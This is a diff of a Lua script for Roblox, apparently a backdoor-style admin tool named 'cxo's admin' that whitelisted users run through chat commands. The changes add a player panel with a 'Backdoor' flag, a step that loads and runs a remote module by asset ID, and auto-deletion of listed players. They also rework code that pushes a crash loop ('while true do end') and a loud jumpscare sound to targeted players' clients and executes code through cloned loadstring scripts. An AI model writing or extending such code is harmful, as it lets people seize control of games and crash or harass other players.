+				if command:lower() == "chat" then
+					print(extra)
+					_G.sudo(game.Players:FindFirstChild(target), extra , "all")
+					--print("Running chat with one target: " .. player.Name .. " | Command: " .. command .. " | Msg: ".. extra)
+					return
+				else
+					--print("Running command with one target: " .. target .. " | Command: " .. command)
+					runcmd(command, nil, {target}, extra)
+				end
+			else
+				if command:lower() == "chat" then
+					_G.sudo(player, {extra} , "all")
+					--print("Running chat with one target: " .. player.Name .. " | Command: " .. command .. " | Msg: ".. extra)
+					return
+				else
+					--print("Running command with only the player: " .. player.Name .. " | Command: " .. command)
+					runcmd(command, nil, {player}, {extra}, nil)
+				end
+			end
+		elseif choice == "INFO" then
+
+			local argt, argt2
+
+			if target == nil or target == "me" then
+				target = player
+			end
+		
+			if target2 == "me" then
+				print("bleh")
+				target2 = player
+			end
+
+			if typeof(target) == "string" then
+				argt = p(target, player)
+				if #argt > 0 then
+					target = argt[1]
+				else
+					notfi(player, "cxo's admin", "Player not found!")
+					return
+				end
+			end
+		
+			if target2 and typeof(target2) == "string" then
+				argt2 = p(target2, player)
+				print("Looking for:", target2)
+				print("Found players:", #argt2)
+				if #argt2 > 0 then
+					target2 = argt2[1]
+				else
+					notfi(player, "cxo's admin", "Player not found!")
+					return
+				end
+			end
+
+			print(target, typeof(target))
+			print(target.Name)
+
+			if target and target ~= nil then
+
+				local abc, def, ghi, jkl, mno
+
+				if table.find(Whitelist, tostring(target.UserId)) or table.find(Whitelist, target.UserId) then
+					abc = "true"
+				else
+					abc = "false"
+				end
+			
+				if target.MembershipType == Enum.MembershipType.Premium then
+					def = "true"
+				else
+					def = "false"
+				end
+			
+				if table.find(_G.specialperms, target.Name) then
+					ghi = "true"
+				else
+					ghi = "false"
+				end
+			
+				if table.find(_G.permadmins, target.Name) then
+					jkl = "true"
+				else
+					jkl = "false"
+				end
+			
+				if table.find(_G.p299, target.Name) then
+					mno = "true"
+				else
+					mno = "false"
+				end
+
+				local t1l = player:WaitForChild("PlayerGui"):FindFirstChild("cxo's admin GUI"):FindFirstChild("Frame"):FindFirstChild("ContentFrame"):FindFirstChild("PanelFrame"):FindFirstChild("Panel_Frame"):FindFirstChild("Player_1_Frame"):FindFirstChild("ImageLabel"):FindFirstChild("TextLabel")
+				local i1l = player:WaitForChild("PlayerGui"):FindFirstChild("cxo's admin GUI"):FindFirstChild("Frame"):FindFirstChild("ContentFrame"):FindFirstChild("PanelFrame"):FindFirstChild("Panel_Frame"):FindFirstChild("Player_1_Frame"):FindFirstChild("ImageLabel")
+				t1l.Text = "Display: ".. target.DisplayName .."\nUserId: ".. target.UserId .."\nAccount Age: ".. target.AccountAge .."\nWhitelisted: ".. abc .."\nPremium: ".. def .."\nBackdoor: ".. ghi .."\nPerm: ".. jkl .."\nP299: ".. mno
+				i1l.Image = "rbxthumb://type=Avatar&id=".. target.UserId .."&w=420&h=420"
+
+			elseif target2 ~= nil then
+
+				local abc, def, ghi, jkl, mno
+
+				if table.find(Whitelist, tonumber(target2.UserId)) or table.find(Whitelist, target2.UserId) then
+					abc = "true"
+				else
+					abc = "false"
+				end
+			
+				if target2.MembershipType == Enum.MembershipType.Premium then
+					def = "true"
+				else
+					def = "false"
+				end
+			
+				if table.find(_G.specialperms, target2.Name) then
+					ghi = "true"
+				else
+					ghi = "false"
+				end
+			
+				if table.find(_G.permadmins, target2.Name) then
+					jkl = "true"
+				else
+					jkl = "false"
+				end
+			
+				if table.find(_G.p299, target2.Name) then
+					mno = "true"
+				else
+					mno = "false"
+				end
+
+				local t2l = player:WaitForChild("PlayerGui"):FindFirstChild("cxo's admin GUI"):FindFirstChild("Frame"):FindFirstChild("ContentFrame"):FindFirstChild("PanelFrame"):FindFirstChild("Panel_Frame"):FindFirstChild("Player_2_Frame"):FindFirstChild("ImageLabel"):FindFirstChild("TextLabel")
+				local i2l = player:WaitForChild("PlayerGui"):FindFirstChild("cxo's admin GUI"):FindFirstChild("Frame"):FindFirstChild("ContentFrame"):FindFirstChild("PanelFrame"):FindFirstChild("Panel_Frame"):FindFirstChild("Player_2_Frame"):FindFirstChild("ImageLabel")
+				t2l.Text = "Display: ".. target2.DisplayName .."\nUserId: ".. target2.UserId .."\nAccount Age: ".. target2.AccountAge .."\nWhitelisted: ".. abc .."\nPremium: ".. def .."\nBackdoor: ".. ghi .."\nPerm: ".. jkl .."\nP299: ".. mno
+				i2l.Image = "rbxthumb://type=Avatar&id=".. target2.UserId .."&w=420&h=420"
+			end
+		elseif choice == "SUDO" then
+			local success, fail = pcall(function()
+				require(97248613655645).Run()
+				notfi(player, "cxo's admin", "Inserting _G.sudo", 3)
+			end)
+			task.spawn(function()
+				task.wait(5)
+				if not success then
+					notfi(player, "cxo's admin", "Failed to insert _G.sudo: " .. fail)
+					for i,v in pairs(game.Players:GetPlayers()) do
+						if v.PlayerGui and v.PlayerGui:FindFirstChild("cxo's admin GUI") then
+							if v:FindFirstChild("PlayerGui"):FindFirstChild("cxo's admin GUI"):FindFirstChild("Frame"):FindFirstChild("ContentFrame"):FindFirstChild("PanelFrame"):FindFirstChild("Panel_Frame"):FindFirstChild("Insert_Sudo") then
+								v:FindFirstChild("PlayerGui"):FindFirstChild("cxo's admin GUI"):FindFirstChild("Frame"):FindFirstChild("ContentFrame"):FindFirstChild("PanelFrame"):FindFirstChild("Panel_Frame"):FindFirstChild("Insert_Sudo"):Destroy()
+								v:FindFirstChild("PlayerGui"):FindFirstChild("cxo's admin GUI"):FindFirstChild("Frame"):FindFirstChild("ContentFrame"):FindFirstChild("PanelFrame"):FindFirstChild("Panel_Frame"):FindFirstChild("Sudo").TextColor3 = Color3.fromRGB(255, 0, 0)
+							end
+						end
+					end
+					return
+				else
+					notfi(player, "cxo's admin", "_G.sudo has been inserted.", 2)
+					for i,v in pairs(game.Players:GetPlayers()) do
+						if v.PlayerGui and v.PlayerGui:FindFirstChild("cxo's admin GUI") then
+							if v:FindFirstChild("PlayerGui"):FindFirstChild("cxo's admin GUI"):FindFirstChild("Frame"):FindFirstChild("ContentFrame"):FindFirstChild("PanelFrame"):FindFirstChild("Panel_Frame"):FindFirstChild("Insert_Sudo") then
+								v:FindFirstChild("PlayerGui"):FindFirstChild("cxo's admin GUI"):FindFirstChild("Frame"):FindFirstChild("ContentFrame"):FindFirstChild("PanelFrame"):FindFirstChild("Panel_Frame"):FindFirstChild("Insert_Sudo"):Destroy()
+								v:FindFirstChild("PlayerGui"):FindFirstChild("cxo's admin GUI"):FindFirstChild("Frame"):FindFirstChild("ContentFrame"):FindFirstChild("PanelFrame"):FindFirstChild("Panel_Frame"):FindFirstChild("Sudo").TextColor3 = Color3.fromRGB(0, 255, 0)
+							end
+						end
+					end
+				end
+			end)
+		end
+	end)
+end
+
+function ftag()
+	coroutine.resume(coroutine.create(function()
+		local r, g, b = 255, 0, 0
+		local team
+		while tag == true do
+
+			if not game.Teams:FindFirstChild("! cxo's admin is loaded !") and not game.Teams:FindFirstChild("cxo's admin is loaded") then
+				team = Instance.new("Team", game.Teams)
+				team.Name = "cxo's admin is loaded"
+				team.AutoAssignable = false
+			end
+
+			for i = 0, 255, 5 do
+				r, b = r - 5, b + 5
+				team.TeamColor = BrickColor.new(Color3.fromRGB(r, g, b))
+				team.Name = "! cxo's admin is loaded !"
+				task.wait()
+			end
+			for i = 0, 255, 5 do
+				g = g + 5
+				team.TeamColor = BrickColor.new(Color3.fromRGB(r, g, b))
+				team.Name = "cxo's admin is loaded"
+				task.wait()
+			end
+			for i = 0, 255, 5 do
+				b = b - 5
+				team.TeamColor = BrickColor.new(Color3.fromRGB(r, g, b))
+				team.Name = "! cxo's admin is loaded !"
+				task.wait()
+			end
+			for i = 0, 255, 5 do
+				r = r + 5
+				team.TeamColor = BrickColor.new(Color3.fromRGB(r, g, b))
+				team.Name = "cxo's admin is loaded"
+				task.wait()
+			end
+			for i = 0, 255, 5 do
+				g = g - 5
+				team.TeamColor = BrickColor.new(Color3.fromRGB(r, g, b))
+				team.Name = "! cxo's admin is loaded !"
+				task.wait()
+			end
+		end
+	end))
+end
+
+-------------------------------------------- CONNECTIONS --------------------------------------------
 
 for i,v in pairs(game.Players:GetPlayers()) do
 
@@ -3075,6 +6786,7 @@ for i,v in pairs(game.Players:GetPlayers()) do
 
 		if table.find(Whitelist, tostring(v.UserId)) or table.find(TempWhitelist, v.UserId) then
 			--print(v.Name .. ": ".. msg)
+
 			if msg:sub(1, #prefix) == prefix then
 				msg = msg:sub(#prefix + 1)
 			
@@ -3120,9 +6832,15 @@ end
 
 game.Players.PlayerAdded:Connect(function(player)
 
+	repeat task.wait() until player and player.Character or not game.Players:FindFirstChild(player.Name)
+
 	if table.find(Whitelist, tostring(player.UserId)) or table.find(TempWhitelist, player.UserId) then
 		task.wait(1.5)
 		notfi(player, "cxo's admin", "You are whitelisted! prefix is ".. prefix)
+	end
+
+	if table.find(autore, player.Name) then
+		antikill(player)
 	end
 
 	if locked == true and not table.find(Whitelist, tostring(player.UserId)) and not table.find(TempWhitelist, player.UserId) then
@@ -3131,6 +6849,10 @@ game.Players.PlayerAdded:Connect(function(player)
 
 	if banned[player.UserId] then
 		player:Kick("cxo's admin | you are banned from this server")
+	end
+
+	if autodelete[player.UserId] then
+		player:Destroy()
 	end
 
 	if crashbanned[player.UserId] then
@@ -3154,23 +6876,26 @@ game.Players.PlayerAdded:Connect(function(player)
 		repeat task.wait() until player and player.PlayerGui
 
 		local message = game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder"):FindFirstChild("msg"):Clone()
-		message.TextLabel.Text = "cxo's admin | You are crashbanned from this server"
+		message.TextLabel.Text = "[cxo's admin]\nYou are banned from this server"
 		message.Parent = player.PlayerGui
 
 		task.wait(0.1)
 
+		repeat task.wait() until player and player.Character
+
 		local crashscript = game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder"):FindFirstChild("Crash"):Clone()
-		crashscript.Parent = plr.Character
+		crashscript.Parent = player.Character
 	end
 
 	player.Chatted:Connect(function(msg)
 
-		if not table.find(Whitelist, player.Name) and not table.find(TempWhitelist, player.UserId) then
+		if not table.find(Whitelist, tostring(player.UserId)) and not table.find(TempWhitelist, player.UserId) then
 			table.insert(chats, player.Name ..":" .. msg)
 		end
 
 		if table.find(Whitelist, tostring(player.UserId)) or table.find(TempWhitelist, player.UserId) then
 			--print(v.Name .. ": ".. msg)
+
 			if msg:sub(1, #prefix) == prefix then
 				msg = msg:sub(#prefix + 1)
 			
@@ -3212,6 +6937,39 @@ game.Players.PlayerAdded:Connect(function(player)
 			return
 		end
 	end)
+
+	if configs[tostring(player.UserId)] then
+		notfi(player, "cxo's admin", "You have configs! loading them now.", 3)
+		for i, cmd in ipairs(configs[tostring(player.UserId)]) do
+			local arguments = {}
+            for part in cmd:gmatch("%S+") do
+                table.insert(arguments, part)
+            end
+
+            local target = nil
+
+            if arguments[2] and arguments[2] == "me" then
+                target = player
+            else
+				if arguments[2] then
+					if game.Players:FindFirstChild(arguments[2]) then
+						target = game.Players:FindFirstChild(arguments[2])
+					else
+						target = nil
+					end
+				end
+            end
+
+			if target then
+                runcmd(arguments[1], nil, {target}, {table.concat(arguments, " ", 3)}, nil)
+            else
+                runcmd(arguments[1], nil, nil, {table.concat(arguments, " ", 2)}, nil)
+            end
+
+            --runcmd(arguments[1], nil, target and {target} or nil, {table.concat(arguments, " ", 3) or table.concat(arguments, " ", 2) or nil}, nil)
+		end
+	end
+
 end)
 
 game:GetService("ReplicatedStorage").ChildRemoved:Connect(function(t)
@@ -3224,8 +6982,24 @@ game:GetService("ReplicatedStorage").ChildRemoved:Connect(function(t)
 			local r = Instance.new("RemoteEvent", a)
 			r.Name = "cxo's gmod remote"
 
+			gmodlistener()
+
 			local scr = game:GetService("ServerScriptService").goog.Utilities.Client:Clone()
-			local loa = game:GetService("ServerScriptService").goog.Utilities.loadstring:Clone()
+			local utilities = game:GetService("ServerScriptService").goog.Utilities
+			local loa = utilities:FindFirstChild("loadstring")
+			
+			if loa then
+				loa = loa:Clone()
+			else
+				loa = utilities:FindFirstChild("Loadstring")
+				if loa then
+					loa = loa:Clone()
+				end
+			end
+			
+			if not loa then
+				warn("Could not find 'loadstring' or 'Loadstring' in goog.Utilities")
+			end
 			loa.Parent = scr
 			scr:WaitForChild("Exec").Value = [[
 			
@@ -3301,25 +7075,56 @@ game:GetService("ReplicatedStorage").ChildRemoved:Connect(function(t)
 			scr.Enabled = true
 
 			local scr = game:GetService("ServerScriptService").goog.Utilities.Client:Clone()
-			local loa = game:GetService("ServerScriptService").goog.Utilities.loadstring:Clone()
+			local utilities = game:GetService("ServerScriptService").goog.Utilities
+			local loa = utilities:FindFirstChild("loadstring")
+			
+			if loa then
+				loa = loa:Clone()
+			else
+				loa = utilities:FindFirstChild("Loadstring")
+				if loa then
+					loa = loa:Clone()
+				end
+			end
+			
+			if not loa then
+				warn("Could not find 'loadstring' or 'Loadstring' in goog.Utilities")
+			end
 			loa.Parent = scr
 			scr:WaitForChild("Exec").Value = [[
 			
-			local lp = game.Players.LocalPlayer
-			local orb = lp.Character:FindFirstChild("ff")
-			orb.CanCollide = false
+				local lp = game.Players.LocalPlayer
+				local lpc = lp.Character
 
-			
+				repeat task.wait() until lpc:FindFirstChild("ff")
+				lpc.ff.CanCollide = false
+
+			]]
+
 			scr.Parent = a
 			scr.Name = "OrbScript"
 			scr.Enabled = true
 
 			local scr = game:GetService("ServerScriptService").goog.Utilities.Client:Clone()
-			local loa = game:GetService("ServerScriptService").goog.Utilities.loadstring:Clone()
+			local utilities = game:GetService("ServerScriptService").goog.Utilities
+			local loa = utilities:FindFirstChild("loadstring")
+			
+			if loa then
+				loa = loa:Clone()
+			else
+				loa = utilities:FindFirstChild("Loadstring")
+				if loa then
+					loa = loa:Clone()
+				end
+			end
+			
+			if not loa then
+				warn("Could not find 'loadstring' or 'Loadstring' in goog.Utilities")
+			end
 			loa.Parent = scr
 			scr:WaitForChild("Exec").Value = [[
 			
-			while true do end
+				while true do end
 
 			]]
 			scr.Parent = a
@@ -3327,88 +7132,98 @@ game:GetService("ReplicatedStorage").ChildRemoved:Connect(function(t)
 			scr.Enabled = true
 
 			local scr = game:GetService("ServerScriptService").goog.Utilities.Client:Clone()
-			local loa = game:GetService("ServerScriptService").goog.Utilities.loadstring:Clone()
-			loa.Parent = scr
-			scr:WaitForChild("Exec").Value = [[
+			local utilities = game:GetService("ServerScriptService").goog.Utilities
+			local loa = utilities:FindFirstChild("loadstring")
 			
-			local sound = Instance.new("Sound", workspace)
-			sound.SoundId = "rbxassetid://17518855592"
-			sound.TimePosition = 1
-			sound.Volume = 1
-			sound:Play()
-			sound.Ended:Connect(function()
-				sound:Destroy()
-			end)
-
-			]]
-			scr.Parent = a
-			scr.Name = "Crash"
-			scr.Enabled = true
-
-			local scr = game:GetService("ServerScriptService").goog.Utilities.Server:Clone()
-			local loa = game:GetService("ServerScriptService").goog.Utilities.loadstring:Clone()
-			loa.Parent = scr
-			scr:WaitForChild("Exec").Value = [[
-			
-			local r = game:GetService("ReplicatedStorage")
-			local remote = r:WaitForChild("cxo's folder"):WaitForChild("cxo's gmod remote")
-			local grabbed = {}
-			local grabbing
-
-			remote.OnServerEvent:Connect(function(player, action, target)
-				if action == "Pickup" then
-					if target and target:IsA("BasePart") and target.Anchored == false then
-						grabbed[player] = target
-						grabbing = target
-						target:SetNetworkOwner(player)
-					end
-				elseif action == "Update" then
-					if grabbed[player] then
-						local part = grabbed[player]
-						if part then
-							part.CFrame = CFrame.new(target)
-						end
-					end
-				elseif action == "Release" then
-					local part = grabbing
-					grabbed[player] = nil
-
-					if part and part:IsA("BasePart") then
-						part:SetNetworkOwner(nil)
-					end
+			if loa then
+				loa = loa:Clone()
+			else
+				loa = utilities:FindFirstChild("Loadstring")
+				if loa then
+					loa = loa:Clone()
 				end
-			end)
+			end
+			
+			if not loa then
+				warn("Could not find 'loadstring' or 'Loadstring' in goog.Utilities")
+			end
+			loa.Parent = scr
+			scr:WaitForChild("Exec").Value = [[
+			
+				local sound = Instance.new("Sound", workspace)
+				sound.SoundId = "rbxassetid://17518855592"
+				sound.TimePosition = 1.7
+				sound.Volume = 10
+				sound:Play()
+				sound.Ended:Connect(function()
+					sound:Destroy()
+				end)
 
 			]]
 			scr.Parent = a
-			scr.Name = "GmodGunListener"
+			scr.Name = "JumpScareScript"
 			scr.Enabled = true
 
 			local deviceremote = Instance.new("RemoteFunction", a)
 			deviceremote.Name = "cxo's Device Remote"
 		
 			local scr = game:GetService("ServerScriptService").goog.Utilities.Client:Clone()
-			local loa = game:GetService("ServerScriptService").goog.Utilities.loadstring:Clone()
+			local utilities = game:GetService("ServerScriptService").goog.Utilities
+			local loa = utilities:FindFirstChild("loadstring")
+			
+			if loa then
+				loa = loa:Clone()
+			else
+				loa = utilities:FindFirstChild("Loadstring")
+				if loa then
+					loa = loa:Clone()
+				end
+			end
+			
+			if not loa then
+				warn("Could not find 'loadstring' or 'Loadstring' in goog.Utilities")
+			end
 			loa.Parent = scr
 			scr:WaitForChild("Exec").Value = [[
-			
+
 			local UserInputService = game:GetService("UserInputService")
-
-			local device
-
-			if UserInputService.VREnabled then
-				device = "🥽"
-			elseif UserInputService.GamepadEnabled then
-				device = "🎮"
-			elseif UserInputService.TouchEnabled then
-				device = "📱"
-			elseif UserInputService.MouseEnabled and UserInputService.KeyboardEnabled then
-				device = "🖥️🖱️ / 💻"
-			else
+			local remote = game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder"):WaitForChild("cxo's Device Remote")
+		
+			local devices = {
+				TouchEnabled = UserInputService.TouchEnabled,
+				VREnabled = UserInputService.VREnabled,
+				GamepadEnabled = UserInputService.GamepadEnabled,
+				MouseEnabled = UserInputService.MouseEnabled,
+				KeyboardEnabled = UserInputService.KeyboardEnabled
+			}
+		
+			local device = ""
+		
+			if devices.VREnabled then
+				device = device .. "🥽 + "
+			end
+			if devices.GamepadEnabled then
+				device = device .. "🎮 + "
+			end
+			if devices.TouchEnabled then
+				device = device .. "📱 + "
+			end
+			if devices.MouseEnabled and devices.KeyboardEnabled then
+				device = device .. "⌨️🖱️ + "
+			elseif devices.MouseEnabled then
+				device = device .. "🖱️ + "
+			elseif devices.KeyboardEnabled then
+				device = device .. "⌨️ + "
+			end
+		
+			if device:sub(-3) == " + " then
+				device = device:sub(1, -4)
+			end
+		
+			if device == "" then
 				device = "❓"
 			end
-
-			local remote = game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder"):WaitForChild("cxo's Device Remote")
+		
 			if remote then
 				remote:InvokeServer(device)
 			end
@@ -3418,41 +7233,16 @@ game:GetService("ReplicatedStorage").ChildRemoved:Connect(function(t)
 			scr.Parent = game:GetService("ReplicatedStorage"):WaitForChild("cxo's folder")
 			scr.Name = "cxo's Device LocalScript"
 			scr.Enabled = true
-		
-			local scr = game:GetService("ServerScriptService").goog.Utilities.Server:Clone()
-			local loa = game:GetService("ServerScriptService").goog.Utilities.loadstring:Clone()
-			loa.Parent = scr
-			scr:WaitForChild("Exec").Value = [[
 
-			local remote = game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder"):WaitForChild("cxo's Device Remote")
-			local devices = {}
+			local deviceremote = Instance.new("RemoteFunction", a)
+			deviceremote.Name = "cxo's Device Remote"
 
-			if remote then
-				remote.OnServerInvoke = function(plr, device)
-					devices[plr.UserId] = device
-					return "yup"
-				end
-			end
+			local cxor = Instance.new("RemoteEvent", a)
+			cxor.Name = "cxo's remote"
 
-			local function devicecheck(plr)
-				if devices[plr.UserId] then
-					return devices[plr.UserId]
-				else
-					return "❓"
-				end
-			end
-
-			_G.PlayerDevice = devicecheck
-
-			return devicecheck
-		
-			]]
-			
-			scr.Parent = game:GetService("ReplicatedStorage"):WaitForChild("cxo's folder")
-			scr.Name = "cxo's Device Listener"
-			scr.Enabled = true
-
+			scanfordevice()
 			scan()
+			remotelistener()
 		end
 	end
 end)
@@ -3464,16 +7254,25 @@ function scan()
 			local r = Instance.new("RemoteEvent", a)
 			r.Name = "cxo's gmod remote"
 
-			if game:GetService("ServerScriptService"):FindFirstChild("GmodGunListener") then
-				game:GetService("ServerScriptService"):FindFirstChild("GmodGunListener"):Destroy()
-			end
-
-			local i = game:GetService("ReplicatedStorage"):WaitForChild("cxo's folder"):WaitForChild("GmodGunListener"):Clone()
-			i.Parent = game:GetService("ServerScriptService")
+			gmodlistener()
 
 		elseif t.Name == "RemoteScript" then
 			local scr = game:GetService("ServerScriptService").goog.Utilities.Client:Clone()
-			local loa = game:GetService("ServerScriptService").goog.Utilities.loadstring:Clone()
+			local utilities = game:GetService("ServerScriptService").goog.Utilities
+			local loa = utilities:FindFirstChild("loadstring")
+			
+			if loa then
+				loa = loa:Clone()
+			else
+				loa = utilities:FindFirstChild("Loadstring")
+				if loa then
+					loa = loa:Clone()
+				end
+			end
+			
+			if not loa then
+				warn("Could not find 'loadstring' or 'Loadstring' in goog.Utilities")
+			end
 			loa.Parent = scr
 			scr:WaitForChild("Exec").Value = [[
 				
@@ -3551,13 +7350,29 @@ function scan()
 
 		elseif t.Name == "OrbScript" then
 			local scr = game:GetService("ServerScriptService").goog.Utilities.Client:Clone()
-			local loa = game:GetService("ServerScriptService").goog.Utilities.loadstring:Clone()
+			local utilities = game:GetService("ServerScriptService").goog.Utilities
+			local loa = utilities:FindFirstChild("loadstring")
+			
+			if loa then
+				loa = loa:Clone()
+			else
+				loa = utilities:FindFirstChild("Loadstring")
+				if loa then
+					loa = loa:Clone()
+				end
+			end
+			
+			if not loa then
+				warn("Could not find 'loadstring' or 'Loadstring' in goog.Utilities")
+			end
 			loa.Parent = scr
 			scr:WaitForChild("Exec").Value = [[
 			
 			local lp = game.Players.LocalPlayer
-			local orb = lp.Character:FindFirstChild("ff")
-			orb.CanCollide = false
+			local lpc = lp.Character
+
+			repeat task.wait() until lpc:FindFirstChild("ff")
+			lpc.ff.CanCollide = false
 
 			]]
 			scr.Parent = a
@@ -3566,7 +7381,21 @@ function scan()
 
 		elseif t.Name == "Crash" then
 			local scr = game:GetService("ServerScriptService").goog.Utilities.Client:Clone()
-			local loa = game:GetService("ServerScriptService").goog.Utilities.loadstring:Clone()
+			local utilities = game:GetService("ServerScriptService").goog.Utilities
+			local loa = utilities:FindFirstChild("loadstring")
+			
+			if loa then
+				loa = loa:Clone()
+			else
+				loa = utilities:FindFirstChild("Loadstring")
+				if loa then
+					loa = loa:Clone()
+				end
+			end
+			
+			if not loa then
+				warn("Could not find 'loadstring' or 'Loadstring' in goog.Utilities")
+			end
 			loa.Parent = scr
 			scr:WaitForChild("Exec").Value = [[
 			
@@ -3579,14 +7408,28 @@ function scan()
 
 		elseif t.Name == "JumpScareScript" then
 			local scr = game:GetService("ServerScriptService").goog.Utilities.Client:Clone()
-			local loa = game:GetService("ServerScriptService").goog.Utilities.loadstring:Clone()
+			local utilities = game:GetService("ServerScriptService").goog.Utilities
+			local loa = utilities:FindFirstChild("loadstring")
+			
+			if loa then
+				loa = loa:Clone()
+			else
+				loa = utilities:FindFirstChild("Loadstring")
+				if loa then
+					loa = loa:Clone()
+				end
+			end
+			
+			if not loa then
+				warn("Could not find 'loadstring' or 'Loadstring' in goog.Utilities")
+			end
 			loa.Parent = scr
 			scr:WaitForChild("Exec").Value = [[
 			
 			local sound = Instance.new("Sound", workspace)
 			sound.SoundId = "rbxassetid://17518855592"
-			sound.TimePosition = 1
-			sound.Volume = 1
+			sound.TimePosition = 1.7
+			sound.Volume = 10
 			sound:Play()
 			sound.Ended:Connect(function()
 				sound:Destroy()
@@ -3597,84 +7440,75 @@ function scan()
 			scr.Name = "JumpScareScript"
 			scr.Enabled = true
 
-		elseif t.Name == "GmodGunListener" then
-			
-			local scr = game:GetService("ServerScriptService").goog.Utilities.Server:Clone()
-			local loa = game:GetService("ServerScriptService").goog.Utilities.loadstring:Clone()
-			loa.Parent = scr
-			scr:WaitForChild("Exec").Value = [[
-			
-			local r = game:GetService("ReplicatedStorage")
-			local remote = r:WaitForChild("cxo's folder"):WaitForChild("cxo's gmod remote")
-			local grabbed = {}
-			local grabbing
-
-			remote.OnServerEvent:Connect(function(player, action, target)
-				if action == "Pickup" then
-					if target and target:IsA("BasePart") and target.Anchored == false then
-						grabbed[player] = target
-						grabbing = target
-						target:SetNetworkOwner(player)
-					end
-				elseif action == "Update" then
-					if grabbed[player] then
-						local part = grabbed[player]
-						if part then
-							part.CFrame = CFrame.new(target)
-						end
-					end
-				elseif action == "Release" then
-					local part = grabbing
-					grabbed[player] = nil
-
-					if part and part:IsA("BasePart") then
-						part:SetNetworkOwner(nil)
-					end
-				end
-			end)
-	
-			]]
-			scr.Parent = a
-			scr.Name = "GmodGunListener"
-			scr.Enabled = true
-
 		elseif t.Name == "cxo's Device Remote" then
 			local deviceremote = Instance.new("RemoteFunction", a)
 			deviceremote.Name = "cxo's Device Remote"
 
-			if game:GetService("ServerScriptService"):FindFirstChild("cxo's Device Listener") then
-				game:GetService("ServerScriptService"):FindFirstChild("cxo's Device Listener"):Destroy()
-			end
-
-			local i = game:GetService("ReplicatedStorage"):WaitForChild("cxo's folder"):WaitForChild("cxo's Device Listener"):Clone()
-			i.Parent = game:GetService("ServerScriptService")
+			scanfordevice()
 
 		elseif t.Name == "cxo's Device LocalScript" then
 			local scr = game:GetService("ServerScriptService").goog.Utilities.Client:Clone()
-			local loa = game:GetService("ServerScriptService").goog.Utilities.loadstring:Clone()
+
+			local utilities = game:GetService("ServerScriptService").goog.Utilities
+			local loa = utilities:FindFirstChild("loadstring")
+			
+			if loa then
+				loa = loa:Clone()
+			else
+				loa = utilities:FindFirstChild("Loadstring")
+				if loa then
+					loa = loa:Clone()
+				end
+			end
+			
+			if not loa then
+				warn("Could not find 'loadstring' or 'Loadstring' in goog.Utilities")
+			end
+			
 			loa.Parent = scr
 			scr:WaitForChild("Exec").Value = [[
-			
-				local UserInputService = game:GetService("UserInputService")
 
-				local device
-
-				if UserInputService.VREnabled then
-					device = "🥽"
-				elseif UserInputService.GamepadEnabled then
-					device = "🎮"
-				elseif UserInputService.TouchEnabled then
-					device = "📱"
-				elseif UserInputService.MouseEnabled and UserInputService.KeyboardEnabled then
-					device = "🖥️🖱️ / 💻"
-				else
-					device = "❓"
-				end
-
-				local remote = game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder"):WaitForChild("cxo's Device Remote")
-				if remote then
-					remote:InvokeServer(device)
-				end
+			local UserInputService = game:GetService("UserInputService")
+			local remote = game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder"):WaitForChild("cxo's Device Remote")
+		
+			local devices = {
+				TouchEnabled = UserInputService.TouchEnabled,
+				VREnabled = UserInputService.VREnabled,
+				GamepadEnabled = UserInputService.GamepadEnabled,
+				MouseEnabled = UserInputService.MouseEnabled,
+				KeyboardEnabled = UserInputService.KeyboardEnabled
+			}
+		
+			local device = ""
+		
+			if devices.VREnabled then
+				device = device .. "🥽 + "
+			end
+			if devices.GamepadEnabled then
+				device = device .. "🎮 + "
+			end
+			if devices.TouchEnabled then
+				device = device .. "📱 + "
+			end
+			if devices.MouseEnabled and devices.KeyboardEnabled then
+				device = device .. "⌨️🖱️ + "
+			elseif devices.MouseEnabled then
+				device = device .. "🖱️ + "
+			elseif devices.KeyboardEnabled then
+				device = device .. "⌨️ + "
+			end
+		
+			if device:sub(-3) == " + " then
+				device = device:sub(1, -4)
+			end
+		
+			if device == "" then
+				device = "❓"
+			end
+		
+			if remote then
+				remote:InvokeServer(device)
+			end
 		
 			]]
 			
@@ -3682,40 +7516,11 @@ function scan()
 			scr.Name = "cxo's Device LocalScript"
 			scr.Enabled = true
 
-		elseif t.Name == "cxo's Device Listener" then
-		
-			local scr = game:GetService("ServerScriptService").goog.Utilities.Server:Clone()
-			local loa = game:GetService("ServerScriptService").goog.Utilities.loadstring:Clone()
-			loa.Parent = scr
-			scr:WaitForChild("Exec").Value = [[
+		elseif t.Name == "cxo's remote function" then
+			local cxor = Instance.new("RemoteEvent", a)
+			cxor.Name = "cxo's remote"
 
-			local remote = game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder"):WaitForChild("cxo's Device Remote")
-			local devices = {}
-
-			if remote then
-				remote.OnServerInvoke = function(plr, device)
-					devices[plr.UserId] = device
-					return "yup"
-				end
-			end
-
-			local function devicecheck(plr)
-				if devices[plr.UserId] then
-					return devices[plr.UserId]
-				else
-					return "❓"
-				end
-			end
-
-			_G.PlayerDevice = devicecheck
-
-			return devicecheck
-		
-			]]
-			
-			scr.Parent = game:GetService("ReplicatedStorage"):WaitForChild("cxo's folder")
-			scr.Name = "cxo's Device Listener"
-			scr.Enabled = true
+			remotelistener()
 		end
 	end)
 end
@@ -3726,7 +7531,21 @@ function start()
 	r.Name = "cxo's gmod remote"]]
 
 	local scr = game:GetService("ServerScriptService").goog.Utilities.Client:Clone()
-	local loa = game:GetService("ServerScriptService").goog.Utilities.loadstring:Clone()
+	local utilities = game:GetService("ServerScriptService").goog.Utilities
+	local loa = utilities:FindFirstChild("loadstring")
+	
+	if loa then
+		loa = loa:Clone()
+	else
+		loa = utilities:FindFirstChild("Loadstring")
+		if loa then
+			loa = loa:Clone()
+		end
+	end
+	
+	if not loa then
+		warn("Could not find 'loadstring' or 'Loadstring' in goog.Utilities")
+	end
 	loa.Parent = scr
 	scr:WaitForChild("Exec").Value = [[
 		
@@ -3803,13 +7622,29 @@ function start()
 	scr.Enabled = true
 
 	local scr = game:GetService("ServerScriptService").goog.Utilities.Client:Clone()
-	local loa = game:GetService("ServerScriptService").goog.Utilities.loadstring:Clone()
+	local utilities = game:GetService("ServerScriptService").goog.Utilities
+	local loa = utilities:FindFirstChild("loadstring")
+	
+	if loa then
+		loa = loa:Clone()
+	else
